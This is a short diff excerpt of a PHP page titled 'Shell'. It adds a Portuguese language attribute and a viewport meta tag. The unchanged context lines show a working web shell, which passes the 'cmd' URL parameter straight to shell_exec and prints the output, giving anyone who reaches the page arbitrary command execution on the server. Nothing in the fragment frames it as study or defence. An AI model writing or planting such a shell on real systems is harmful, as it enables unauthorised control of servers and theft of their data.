@@ -8,11 +8,12 @@ $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -la';
 $output = shell_exec($cmd . ' 2>&1');
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="pt">
 
 <head>
   <meta charset="UTF-8">
   <title>Shell</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       background: #111;
